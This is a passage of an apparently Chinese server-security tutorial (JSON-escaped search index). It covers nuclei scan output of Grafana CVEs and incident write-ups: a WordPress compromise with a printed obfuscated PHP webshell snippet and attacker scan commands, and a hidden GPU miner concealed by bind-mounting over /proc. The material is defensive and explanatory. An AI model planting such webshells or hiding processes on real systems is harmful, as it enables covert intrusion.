<p>\u200b\u626b\u63cf\u5668\u200b\u672c\u8eab\u200b\u662f\u200b\u4e2d\u6027\u200b\u7684\u200b\u5de5\u5177\u200b\uff0c\u200b\u65e2\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u68c0\u67e5\u200b\u5df2\u6709\u200b\u7684\u200b\u7cfb\u7edf\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u653b\u51fb\u8005\u200b\u5feb\u901f\u200b\u53d1\u73b0\u200b\u5df2\u6709\u200b\u7684\u200b\u5b89\u5168\u6f0f\u6d1e\u200b\u3002\u200b\u8bf7\u4ec5\u200b\u5728\u200b\u5f97\u5230\u200b\u6388\u6743\u200b\u7684\u200b\u524d\u63d0\u200b\u4e0b\u200b\u4f7f\u7528\u200b\u8fd9\u200b\u7c7b\u200b\u5de5\u5177\u200b\uff0c\u200b\u5426\u5219\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6709\u200b\u4e25\u91cd\u200b\u7684\u200b\u6cd5\u5f8b\u200b\u98ce\u9669\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u591a\u5e74\u200b\u524d\u200b\u4f7f\u7528\u200b nuclei \u200b\u626b\u63cf\u200b\u4e00\u4e2a\u200b\u957f\u65f6\u95f4\u200b\u672a\u200b\u5347\u7ea7\u200b\u7684\u200b Grafana \u200b\u5b9e\u4f8b\u200b\u7684\u200b\u7ed3\u679c\u200b\uff1a</p> <pre><code>$ nuclei -u https://grafana.example.com -tags grafana\n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   2.5.4\n\n  projectdiscovery.io\n\n[WRN] Use with caution. You are responsible for your actions.\n[WRN] Developers assume no liability and are not responsible for any misuse or damage.\n[INF] Using Nuclei Engine 2.5.4 (latest)\n[INF] Using Nuclei Templates 8.7.0 (latest)\n[INF] Using Interactsh Server https://interactsh.com\n[INF] Templates added in last update: 2681\n[INF] Templates loaded for scan: 7\n[2021-12-07 22:19:00] [CVE-2020-11110] [http] [medium] https://grafana.example.com/api/snapshots\n[2021-12-07 22:19:01] [CVE-2021-39226] [http] [critical] https://grafana.example.com/api/snapshots/:key\n[2021-12-07 22:19:01] [CVE-2019-15043] [http] [high] https://grafana.example.com/api/snapshots\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u626b\u63cf\u5668\u200b\u8f7b\u677e\u200b\u5730\u200b\u53d1\u73b0\u200b\u4e86\u200b\u5df2\u6709\u200b\u7684\u200b\u4e09\u4e2a\u200b\u6f0f\u6d1e\u200b\u3002\u200b\u76f8\u5173\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u5728\u200b\u5f97\u5230\u200b\u626b\u63cf\u200b\u7ed3\u679c\u200b\u540e\u200b\uff0c\u200b\u8fc5\u901f\u200b\u5347\u7ea7\u200b\u4e86\u200b\u8be5\u200b Grafana \u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u89e3\u51b3\u200b\u4e86\u200b\u6b64\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"ops/security/#security-event-example","title":"\u5b89\u5168\u4e8b\u4ef6\u200b\u5904\u7406\u200b\u793a\u4f8b","text":"<p>\u200b\u4ee5\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u4ecb\u7ecd\u200b\u4e00\u4e9b\u200b\u771f\u5b9e\u200b\u7684\u200b\u5b89\u5168\u4e8b\u4ef6\u200b\u7d27\u6025\u200b\u5904\u7406\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u90e8\u5206\u200b\u7ec6\u8282\u200b\u505a\u200b\u6a21\u7cca\u5316\u200b\u4fee\u6539\u200b\u5904\u7406\u200b\u3002</p>"},{"location":"ops/security/#password-leak-rce-example","title":"\u4ece\u200b\u6cc4\u6f0f\u200b\u5bc6\u7801\u200b\u5230\u200b RCE","text":"<p>2023 \u200b\u5e74\u200b\u5e74\u5e95\u200b\u7684\u200b\u67d0\u65e5\u200b\uff0c\u200b\u7ba1\u7406\u5458\u200b C \u200b\u53d1\u73b0\u200b\u7ef4\u62a4\u200b\u7684\u200b WordPress \u200b\u7f51\u7ad9\u200b\u65e0\u6cd5\u200b\u6253\u5f00\u200b\uff0c\u200b\u8fd4\u56de\u200b 502 \u200b\u9519\u8bef\u200b\u3002\u200b\u8be5\u200b WordPress \u200b\u7f51\u7ad9\u200b\u8fd0\u884c\u200b\u5728\u200b\u4e00\u4e2a\u200b\u5bb9\u5668\u200b\u4e2d\u200b\u3002\u200b\u4f7f\u7528\u200b <code>docker top</code> \u200b\u68c0\u67e5\u200b\u53d1\u73b0\u200b\u5bb9\u5668\u200b\u91cc\u200b\u51fa\u73b0\u200b\u4e86\u200b\u5947\u602a\u200b\u7684\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u5982\u200b\uff1a</p> <pre><code>/bin/sh -c cd /tmp/f;./cc -c a.ini;echo 17fbf238b;pwd;echo 222d091e\n./out -a 192.168.0.0/24 -nobr -np -nopoc -o /tmp/oo.log\n</code></pre> <p>\u200b\u68c0\u67e5\u200b\u5bb9\u5668\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u53d1\u73b0\u200b <code>/tmp</code> \u200b\u4e0b\u9762\u200b\u591a\u200b\u4e86\u200b\u5f88\u591a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4e00\u4e9b\u200b log \u200b\u6587\u4ef6\u200b\u4f3c\u4e4e\u200b\u662f\u200b\u5185\u7f51\u200b\u626b\u63cf\u5668\u200b\u7684\u200b\u8f93\u51fa\u200b\u3002\u200b\u56e0\u6b64\u200b\u7ba1\u7406\u5458\u200b C \u200b\u7acb\u523b\u200b\u5173\u95ed\u200b\u4e86\u200b\u5bb9\u5668\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5bfc\u51fa\u200b\u4e86\u200b\u5bb9\u5668\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4ee5\u53ca\u200b\u6570\u636e\u5e93\u200b\uff08\u200b\u5728\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5bb9\u5668\u200b\u4e2d\u200b\uff09\u200b\u4ee5\u200b\u8fdb\u4e00\u6b65\u200b\u68c0\u67e5\u200b\u3002</p> <p>\u200b\u7531\u4e8e\u200b\u914d\u7f6e\u200b\u95ee\u9898\u200b\uff0c\u200b\u5bb9\u5668\u200b\u5916\u200b\u7684\u200b Nginx \u200b\u65e5\u5fd7\u200b\u8bb0\u5f55\u200b\u7684\u200b IP \u200b\u5747\u200b\u4e3a\u200b CDN \u200b\u7684\u200b IP\uff0c\u200b\u6ca1\u6709\u200b\u8bb0\u5f55\u200b\u5230\u200b\u771f\u5b9e\u200b IP \u200b\u5730\u5740\u200b\u3002\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u89c2\u5bdf\u200b\u8bbf\u95ee\u200b\u7684\u200b URL\uff0c\u200b\u53d1\u73b0\u200b\u5b58\u5728\u200b\u53ef\u7591\u200b\u7684\u200b\u8bbf\u95ee\u200b\u4e3b\u9898\u200b\u7f16\u8f91\u5668\u200b\u7684\u200b <code>POST</code> \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u6839\u636e\u200b\u76f8\u5173\u200b\u7684\u200b User agent \u200b\u8bb0\u5f55\u200b\uff0c\u200b\u53d1\u73b0\u200b\u653b\u51fb\u8005\u200b\u4f3c\u4e4e\u200b\u5728\u200b\u5c1d\u8bd5\u200b\u767b\u5f55\u200b\u7f51\u7ad9\u200b\u540e\u53f0\u200b\u3002</p> <p>\u200b\u68c0\u67e5\u200b WordPress \u200b\u672c\u5730\u200b\u6587\u4ef6\u200b\u7684\u200b\u4fee\u6539\u200b\u65e5\u671f\u200b\uff0c\u200b\u53d1\u73b0\u200b\u67d0\u4e2a\u200b\u4e3b\u9898\u200b\u6587\u4ef6\u200b\u7684\u200b\u4fee\u6539\u200b\u65e5\u671f\u200b\u4e0d\u200b\u6b63\u5e38\u200b\uff0c\u200b\u5f00\u5934\u200b\u63d2\u5165\u200b\u4e86\u200b\u4ee5\u4e0b\u200b\u7684\u200b PHP\uff1a</p> <pre><code>&lt;?php\n$la=\"&lt;redacted&gt;\";\n$lb=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\nforeach($_POST as$k=&gt;$v){$_POST[$k]=base64_decode(strtr($v,$la,$lb));}\nfunction downloadFile($url,$x){\n  $ary=parse_url($url);\n  $ext = explode('.',$file);\n  $file1=substr($ext[0],3,1);\n  $file2=substr($ext[0],5,1);\n  $file3=substr($ext[0],5,1);\n  return $ary;\n}\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u63a8\u6d4b\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u5728\u200b\u4fee\u6539\u200b\u4e86\u200b\u4e3b\u9898\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u4e3b\u9898\u200b\u7684\u200b PHP \u200b\u6587\u4ef6\u200b\u6267\u884c\u200b\u4efb\u610f\u200b\u547d\u4ee4\u200b\u4e86\u200b\u3002</p> <p>\u200b\u7ba1\u7406\u5458\u200b C \u200b\u4e4b\u524d\u200b\u914d\u7f6e\u200b\u4e86\u200b WordPress \u200b\u672c\u4f53\u200b\u4e0e\u200b\u63d2\u4ef6\u200b\u7684\u200b\u81ea\u52a8\u200b\u5347\u7ea7\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5927\u200b\u6982\u7387\u200b\u662f\u200b\u67d0\u4e2a\u200b\u7ba1\u7406\u5458\u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u6cc4\u6f0f\u200b\u5bfc\u81f4\u200b\u7684\u200b\u3002\u200b\u7531\u4e8e\u200b\u8be5\u200b\u7f51\u7ad9\u200b\u91cd\u8981\u6027\u200b\u4e0d\u9ad8\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u82b1\u200b\u4e00\u4e9b\u200b\u65f6\u95f4\u200b\u4ed4\u7ec6\u68c0\u67e5\u200b\u540e\u200b\u518d\u200b\u8003\u8651\u200b\u91cd\u65b0\u200b\u4e0a\u7ebf\u200b\u3002\u200b\u51e0\u65e5\u200b\u540e\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u5411\u200b\u53e6\u4e00\u540d\u200b\u7ba1\u7406\u5458\u200b\u53d1\u9001\u200b\u90ae\u4ef6\u200b\u81f4\u6b49\u200b\uff0c\u200b\u5e76\u4e14\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5165\u4fb5\u200b\u624b\u6bb5\u200b\uff1a\u200b\u4ece\u200b\u67d0\u4e2a\u200b\u4fc4\u7f57\u65af\u200b botnet \u200b\u4e2d\u200b\u83b7\u53d6\u200b\u4e86\u200b\u6cc4\u6f0f\u200b\u7684\u200b\u7528\u6237\u540d\u200b\u4e0e\u200b\u5bc6\u7801\u200b\uff08\u200b\u653b\u51fb\u8005\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u5b89\u88c5\u200b\u4e86\u200b\u6709\u200b\u95ee\u9898\u200b\u7684\u200b\u7834\u89e3\u200b\u7a0b\u5e8f\u200b\u5bfc\u81f4\u200b\u7684\u200b\uff09\uff0c\u200b\u4e4b\u540e\u200b\u767b\u5f55\u200b\u5165\u4fb5\u200b\u540e\u200b\u5c1d\u8bd5\u200b\u505a\u200b\u4e86\u200b\u5185\u7f51\u200b\u626b\u63cf\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8be5\u200b\u5bc6\u7801\u200b\u540c\u6837\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u767b\u5f55\u200b\u6b64\u4eba\u200b\u5728\u200b\u8be5\u200b\u7ec4\u7ec7\u200b\u7684\u200b GitLab \u200b\u8d26\u53f7\u200b\u3002\u200b\u5728\u200b\u7b2c\u4e00\u200b\u65f6\u95f4\u200b\u5c01\u7981\u200b\u4e86\u200b\u8be5\u200b GitLab \u200b\u8d26\u53f7\u200b\u540e\u200b\uff0c\u200b\u68c0\u67e5\u200b Nginx \u200b\u65e5\u5fd7\u200b\u83b7\u53d6\u200b\u4e86\u200b\u6240\u6709\u200b\u653b\u51fb\u8005\u200b\u8bbf\u95ee\u200b\u7684\u200b\u4ed3\u5e93\u200b\uff0c\u200b\u4e07\u5e78\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u4ed3\u5e93\u200b\u4e2d\u200b\u4e0d\u200b\u5305\u542b\u200b\u654f\u611f\u200b\u4fe1\u606f\u200b\u3002</p> <p>\u200b\u5728\u200b\u68c0\u67e5\u200b\u786e\u8ba4\u200b\u5176\u4ed6\u200b\u673a\u5668\u200b\u4e0d\u200b\u53d7\u200b\u5f71\u54cd\u200b\u540e\u200b\uff0c\u200b\u5e94\u6025\u200b\u5904\u7406\u200b\u90e8\u5206\u200b\u544a\u4e00\u6bb5\u843d\u200b\u3002\u200b\u4e4b\u540e\u200b\u7ba1\u7406\u5458\u200b C \u200b\u91c7\u53d6\u200b\u4e86\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u4fee\u590d\u200b\u63aa\u65bd\u200b\uff1a</p> <ul> <li>\u200b\u4fee\u590d\u200b\u4e86\u200b\u90e8\u5206\u200b\u60c5\u51b5\u200b\u4e0b\u200b Nginx \u200b\u65e5\u5fd7\u200b\u8bb0\u5f55\u200b IP \u200b\u9519\u8bef\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</li> <li>\u200b\u5bf9\u200b\u786e\u8ba4\u200b\u5bc6\u7801\u200b\u6cc4\u6f0f\u200b\u7684\u200b\u6210\u5458\u200b\u91cd\u7f6e\u200b\u5bc6\u7801\u200b\u3002</li> <li>\u200b\u5f3a\u5236\u200b\u8981\u6c42\u200b\u7ec4\u7ec7\u200b GitLab \u200b\u5185\u200b\u91cd\u8981\u200b\u6210\u5458\u200b\u5f00\u542f\u200b 2FA\u3002</li> <li>\u200b\u68c0\u67e5\u200b GitLab \u200b\u5185\u6709\u200b\u6743\u9650\u200b\u8bbf\u95ee\u200b\u91cd\u8981\u200b\u4ed3\u5e93\u200b\u7684\u200b\u6210\u5458\u200b\u5217\u8868\u200b\uff0c\u200b\u5e76\u4e14\u200b\u79fb\u200b\u9664\u4e86\u200b\u4e00\u4e9b\u200b\u4e0d\u518d\u200b\u53c2\u4e0e\u200b\u4e8b\u52a1\u200b\u7684\u200b\u6210\u5458\u200b\u3002</li> <li>\u200b\u82b1\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u65f6\u95f4\u200b\u4ece\u200b WordPress \u200b\u8fc1\u79fb\u200b\u81f3\u200b\u4e86\u200b\u9759\u6001\u200b\u7684\u200b Jekyll \u200b\u65b9\u6848\u200b\uff0c\u200b\u51cf\u5c0f\u200b\u4e86\u200b\u5bf9\u5916\u200b\u66b4\u9732\u200b\u7684\u200b\u653b\u51fb\u9762\u200b\u3002</li> </ul> <p>\u200b\u4f60\u200b\u7684\u200b\u770b\u6cd5\u200b\uff1f</p> <p>\u200b\u53d7\u5230\u200b\u65f6\u95f4\u200b\u3001\u200b\u6210\u672c\u200b\u4e0e\u200b\u6280\u672f\u200b\u7684\u200b\u9650\u5236\u200b\uff0c\u200b\u4ee5\u4e0a\u200b\u7684\u200b\u5904\u7406\u200b\u4e0d\u662f\u200b\u5b8c\u7f8e\u200b\u7684\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u662f\u200b\u7ba1\u7406\u5458\u200b C\uff0c\u200b\u4f60\u200b\u4f1a\u200b\u505a\u200b\u4ec0\u4e48\u200b\uff1f</p>"},{"location":"ops/security/#lab-server-intrusion","title":"\u4e00\u573a\u200b\u5b9e\u9a8c\u5ba4\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u9690\u79d8\u200b\u5165\u4fb5","text":"<p>2024 \u200b\u5e74\u200b 10 \u200b\u6708\u200b\uff0c\u200b\u6211\u4eec\u200b\u5b9e\u9a8c\u5ba4\u200b\u7684\u200b GPU \u200b\u670d\u52a1\u5668\u200b\u53d1\u751f\u200b\u4e86\u200b\u4e00\u4ef6\u200b\u8be1\u5f02\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u6240\u6709\u200b GPU \u200b\u957f\u65f6\u95f4\u200b 100% \u200b\u5360\u7528\u200b\uff0c\u200b\u4f46\u200b\u5374\u200b\u627e\u200b\u4e0d\u5230\u200b\u4efb\u4f55\u200b\u8fd0\u884c\u200b\u4e2d\u200b\u7684\u200b\u4efb\u52a1\u200b\u3002\u200b\u8fd9\u200b\u7a76\u7adf\u200b\u662f\u200b\u4eba\u6027\u200b\u7684\u200b\u6cef\u706d\u200b\uff0c\u200b\u8fd8\u662f\u200b\u9053\u5fb7\u200b\u7684\u200b\u6ca6\u4e27\u200b\uff1f</p> <p>\u200b\u8d77\u521d\u200b\uff0c\u200b\u6211\u4eec\u200b\u4ee5\u4e3a\u200b\u53ea\u662f\u200b GPU \u200b\u5f02\u5e38\u200b\u5361\u6b7b\u200b\u6216\u662f\u200b\u9a71\u52a8\u200b\u6545\u969c\u200b\uff0c\u200b\u4f46\u200b\u968f\u7740\u200b\u6df1\u5165\u8c03\u67e5\u200b\uff0c\u200b\u771f\u76f8\u200b\u9010\u6e10\u200b\u6d6e\u51fa\u200b\u6c34\u9762\u200b\u2014\u2014\u200b\u8fd9\u662f\u200b\u4e00\u6b21\u200b\u4e25\u91cd\u200b\u7684\u200b\u5b89\u5168\u200b\u5165\u4fb5\u200b\u4e8b\u4ef6\u200b\u3002\u200b\u8fd9\u6b21\u200b\u5165\u4fb5\u200b\u4e0d\u4ec5\u200b\u5f71\u54cd\u200b\u4e86\u200b\u5b9e\u9a8c\u5ba4\u200b\u7684\u200b\u8ba1\u7b97\u200b\u4efb\u52a1\u200b\uff0c\u200b\u4e5f\u200b\u66b4\u9732\u200b\u4e86\u200b\u670d\u52a1\u5668\u200b\u5b89\u5168\u200b\u7ba1\u7406\u200b\u65b9\u9762\u200b\u7684\u200b\u9690\u60a3\u200b\u3002\u200b\u672c\u6587\u200b\u5c06\u200b\u590d\u76d8\u200b\u6574\u4e2a\u200b\u6392\u67e5\u200b\u8fc7\u7a0b\u200b\u3001\u200b\u89e3\u6790\u200b\u653b\u51fb\u200b\u624b\u6cd5\u200b\u3001\u200b\u5206\u4eab\u200b\u7ecf\u9a8c\u6559\u8bad\u200b\uff0c\u200b\u5e2e\u52a9\u200b\u5927\u5bb6\u200b\u63d0\u5347\u200b\u5b89\u5168\u610f\u8bc6\u200b\uff0c\u200b\u907f\u514d\u200b\u906d\u53d7\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u653b\u51fb\u200b\u3002</p>"},{"location":"ops/security/#lab-server-intrusion-description","title":"\u4e8b\u4ef6\u200b\u63cf\u8ff0","text":"<p>2024 \u200b\u5e74\u200b 10 \u200b\u6708\u200b 23 \u200b\u65e5\u200b\uff0c\u200b\u5b9e\u9a8c\u5ba4\u200b\u4e00\u4f4d\u200b\u540c\u5b66\u200b\u5728\u200b\u4f7f\u7528\u200b SLURM \u200b\u63d0\u4ea4\u200b GPU \u200b\u4efb\u52a1\u200b\u81f3\u200b\u8ba1\u7b97\u200b\u8282\u70b9\u200b\u540e\u200b\uff0c\u200b\u53d1\u73b0\u200b\u4efb\u52a1\u200b\u8fdf\u8fdf\u200b\u6ca1\u6709\u54cd\u5e94\u200b\u3002\u200b\u4ed6\u200b\u6253\u5f00\u200b Grafana \u200b\u76d1\u63a7\u200b\uff0c\u200b\u60ca\u8bb6\u200b\u5730\u200b\u53d1\u73b0\u200b\u6240\u6709\u200b GPU \u200b\u7684\u200b\u5229\u7528\u7387\u200b\u90fd\u200b\u5361\u200b\u5728\u200b 100%\uff0c\u200b\u5373\u4f7f\u200b\u53d6\u6d88\u200b\u6389\u200b SLURM \u200b\u4efb\u52a1\u200b\uff0cGPU \u200b\u4f9d\u7136\u200b\u6ee1\u8f7d\u200b\u8fd0\u884c\u200b\u3002\u200b\u5bdf\u89c9\u5230\u200b\u5f02\u5e38\u200b\u540e\u200b\uff0c\u200b\u4ed6\u200b\u7acb\u5373\u200b\u5411\u200b\u6211\u200b\u6c47\u62a5\u200b\u3002</p> <p>\u200b\u6211\u200b\u901a\u8fc7\u200b SSH \u200b\u767b\u5f55\u200b\u5230\u200b\u8fd9\u53f0\u200b\u8ba1\u7b97\u200b\u8282\u70b9\u200b\uff0c\u200b\u8fd0\u884c\u200b <code>nvidia-smi</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b GPU \u200b\u72b6\u6001\u200b\uff0c\u200b\u7ed3\u679c\u200b\u4ee4\u4eba\u9707\u60ca\u200b\u2014\u2014\u200b\u6240\u6709\u200b GPU \u200b\u90fd\u200b\u6ee1\u8f7d\u200b\u8fd0\u884c\u200b\uff0c\u200b\u4f46\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u8fdb\u7a0b\u200b\u5360\u7528\u200b\uff01 \u200b\u8fd9\u200b\u7b80\u76f4\u200b\u592a\u200b\u8be1\u5f02\u200b\u4e86\u200b\u3002\u200b\u66f4\u200b\u4ee4\u4eba\u4e0d\u5b89\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u4ece\u200b 10 \u200b\u6708\u200b 22 \u200b\u65e5\u200b\u5f00\u59cb\u200b\uff0c\u200b\u5b9e\u9a8c\u5ba4\u200b\u7684\u200b\u5176\u4ed6\u200b GPU \u200b\u8ba1\u7b97\u200b\u8282\u70b9\u200b\u4e5f\u200b\u9646\u7eed\u200b\u51fa\u73b0\u200b\u4e86\u200b\u76f8\u540c\u200b\u7684\u200b\u72b6\u51b5\u200b\u3002</p> <p>\u200b\u6211\u200b\u6700\u521d\u200b\u5e76\u672a\u200b\u5f80\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u65b9\u5411\u200b\u8003\u8651\u200b\uff0c\u200b\u800c\u662f\u200b\u6000\u7591\u200b\u6700\u8fd1\u200b\u7cfb\u7edf\u200b\u6216\u200b\u9a71\u52a8\u200b\u51fa\u73b0\u200b\u4e86\u200b\u6545\u969c\u200b\u3002\u200b\u7136\u800c\u200b\uff0cdmesg \u200b\u5185\u6838\u200b\u65e5\u5fd7\u200b\u4e2d\u200b\u6ca1\u6709\u200b GPU \u200b\u76f8\u5173\u200b\u7684\u200b\u9519\u8bef\u4fe1\u606f\u200b\uff1b<code>/var/log/apt/history.log</code> \u200b\u4e5f\u200b\u663e\u793a\u200b\u6700\u8fd1\u200b\u6ca1\u6709\u200b\u66f4\u65b0\u200b\u8fc7\u200b nvidia \u200b\u76f8\u5173\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u3002\u200b\u9664\u4e86\u200b\u75af\u72c2\u200b\u8fd0\u8f6c\u200b\u7684\u200b GPU\uff0c\u200b\u5176\u4f59\u200b\u4e00\u5207\u200b\u90fd\u200b\u770b\u8d77\u6765\u200b\u975e\u5e38\u200b\u201c\u200b\u6b63\u5e38\u200b\u201d\u3002</p> <p>\u200b\u6beb\u65e0\u200b\u5934\u7eea\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u6211\u200b\u5728\u200b\u6280\u672f\u200b\u7fa4\u91cc\u200b\u8be2\u95ee\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e00\u4f4d\u200b\u6709\u200b\u4e30\u5bcc\u200b\u5b89\u5168\u200b\u7ecf\u9a8c\u200b\u7684\u200b\u5927\u4f6c\u200b\u63d0\u9192\u200b\u6211\u200b\uff1a\u201c\u200b\u5c0f\u5fc3\u200b\u6316\u77ff\u200b\uff0c\u200b\u8fdb\u7a0b\u200b\u53ef\u80fd\u200b\u88ab\u200b\u9690\u85cf\u200b\u4e86\u200b\u3002\u201d\u200b\u8fd9\u53e5\u200b\u8bdd\u200b\u8ba9\u200b\u6211\u200b\u604d\u7136\u5927\u609f\u200b\u2014\u2014\u200b\u6211\u4eec\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u53ef\u80fd\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u5165\u4fb5\u200b\u4e86\u200b\u3002</p>"},{"location":"ops/security/#lab-server-intrusion-preliminary-investigation","title":"\u521d\u6b65\u200b\u6392\u67e5","text":"<p>\u200b\u5728\u200b @iBug \u200b\u548c\u200b @taoky \u200b\u4e24\u4f4d\u200b\u540c\u5b66\u200b\u7684\u200b\u5e2e\u52a9\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u7ec8\u4e8e\u200b\u63ed\u5f00\u200b\u4e86\u200b\u653b\u51fb\u8005\u200b\u9690\u85cf\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u795e\u79d8\u200b\u9762\u7eb1\u200b\u3002\u200b\u653b\u51fb\u8005\u200b\u901a\u8fc7\u200b\u5c06\u200b <code>/tmp</code> \u200b\u76ee\u5f55\u200b\u7ed1\u5b9a\u200b\u6302\u8f7d\u200b\u5230\u200b\u6316\u77ff\u200b\u8fdb\u7a0b\u200b\u7684\u200b <code>/proc/PID</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5404\u79cd\u200b\u7cfb\u7edf\u200b\u5de5\u5177\u200b\uff08\u200b\u5982\u200b <code>nvidia-smi</code>\u3001<code>ps</code> \u200b\u548c\u200b <code>htop</code>\uff09\u200b\u65e0\u6cd5\u200b\u8bfb\u53d6\u200b\u5230\u200b\u8fd9\u4e2a\u200b\u76ee\u5f55\u200b\u5185\u200b\u539f\u672c\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u4ece\u800c\u200b\u8fbe\u5230\u200b\u4e86\u200b\u9690\u85cf\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u6548\u679c\u200b\u3002</p>"},{"location":"ops/security/#lab-server-intrusion-hidden-processes","title":"\u5bfb\u627e\u200b\u9690\u85cf\u200b\u8fdb\u7a0b","text":"<p>\u200b\u6211\u4eec\u200b\u4ee5\u200b\u4e00\u53f0\u200b\u53d7\u200b\u5f71\u54cd\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u67e5\u770b\u200b <code>/proc/$$/mountinfo</code>\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u4e86\u200b\u5982\u4e0b\u200b\u5f02\u5e38\u200b\u6761\u76ee\u200b\uff1a</p> <pre><code># grep -wF proc /proc/$$/mountinfo\n392 26 0:28 /tmp /proc/18790 rw,relatime shared:1 - zfs pool0/ROOT/ubuntu rw,xattr,posixacl,casesensitive\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\uff0c<code>18790</code> \u200b\u662f\u200b\u653b\u51fb\u8005\u200b\u9690\u85cf\u200b\u7684\u200b\u8fdb\u7a0b\u200b ID\uff0c\u200b\u653b\u51fb\u8005\u200b\u901a\u8fc7\u200b\u5c06\u200b <code>/tmp</code> \u200b\u76ee\u5f55\u200b bind mount \u200b\u5230\u200b <code>/proc/18790</code> \u200b\u5b9e\u73b0\u200b\u4e86\u200b\u8fdb\u7a0b\u200b\u9690\u85cf\u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002\u200b\u4e3a\u4e86\u200b\u67e5\u770b\u200b\u8be5\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5378\u8f7d\u200b\u8be5\u200b\u6302\u8f7d\u200b\u70b9\u200b\uff1a</p> <pre><code>umount /proc/18790\n</code></pre> <p>\u200b\u5378\u8f7d\u200b\u540e\u200b\uff0c\u200b\u9690\u85cf\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u4fbf\u200b\u663e\u73b0\u51fa\u6765\u200b\u3002\u200b\u7531\u4e8e\u200b <code>/proc/&lt;PID&gt;/exe</code> \u200b\u662f\u200b\u4e00\u4e2a\u200b\u6307\u5411\u200b\u8fdb\u7a0b\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u7684\u200b\u8f6f\u200b\u94fe\u63a5\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5b83\u200b\u67e5\u770b\u200b\u6076\u610f\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u5b9e\u9645\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u8def\u5f84\u200b\uff1a</p> <pre><code># ls -l /proc/18790/exe\nlrwxrwxrwx   1 root root   0 Oct 23 20:27 exe -&gt; /var/tmp/Xorgs*\n</code></pre> <p>\u200b\u901a\u8fc7\u200b\u5982\u200b\u4e0a\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u6211\u4eec\u200b\u5728\u200b\u6240\u6709\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u53d1\u73b0\u200b\u4e86\u200b\u5982\u4e0b\u200b\u4e09\u79cd\u200b\u4e0d\u540c\u200b\u7684\u200b\u9690\u85cf\u200b\u6076\u610f\u200b\u8fdb\u7a0b\u200b\uff1a</p> <ul> <li> <p>\u200b\u9690\u85cf\u200b\u8fdb\u7a0b\u200b 1\uff1a<code>/var/tmp/Xorgs</code></p> 